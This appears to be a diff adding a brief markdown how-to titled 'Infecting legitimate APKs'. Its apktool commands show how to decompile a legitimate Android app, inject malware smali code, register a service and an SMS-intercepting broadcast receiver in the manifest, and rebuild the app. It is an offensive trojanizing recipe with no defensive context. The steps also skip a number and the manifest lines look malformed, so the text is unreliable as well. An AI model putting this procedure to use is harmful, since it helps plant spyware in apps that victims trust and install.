@@ -1,0 +1,27 @@
+#Infecting legitimate APKs
+
+Step1:
+Decompiling the Application
+apktool d [appname].apk
+
+Step2:
+Decompiling the Malicious Application
+apktool d [maliciousapp].apk
+
+Step3:
+cp malware.smali [path to the legitimate application decompiled]/smali/com/legitimate/application/malware.smali
+
+Step5:
+Registering in AndroidManifest.xml
+<service android:name = “malware.java”/>
+
+Setting up the BroadCast Receiver
+<receiver android:name="com.legitimate.application.service"> 
+ <intent-filter>
+ <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+ </intent-filter>
+ </receiver>
+
+Step6:
+Recompile using Apktool
+apktool b appname/
